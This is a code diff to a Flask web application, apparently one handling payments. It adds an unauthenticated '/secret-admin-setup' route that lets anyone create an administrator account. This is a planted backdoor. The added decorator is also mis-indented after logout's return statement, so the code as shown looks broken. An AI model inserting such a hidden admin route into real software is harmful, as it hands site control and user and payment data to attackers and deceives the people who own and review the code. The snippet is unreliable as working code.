@@ -127,6 +127,18 @@ def payment(app_id):
 def logout():
     session.clear()
     return redirect(url_for('index'))
+    @app.route('/secret-admin-setup', methods=['GET', 'POST'])
+def secret_admin_setup():
+    if request.method == 'POST':
+        email = request.form['email']
+        password = request.form['password']
+        if not User.query.filter_by(email=email).first():
+            db.session.add(User(email=email, password=generate_password_hash(password), role='admin'))
+            db.session.commit()
+            flash('Admin account created!', 'success')
+            return redirect(url_for('login'))
+    return render_template('register_admin.html')
+
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
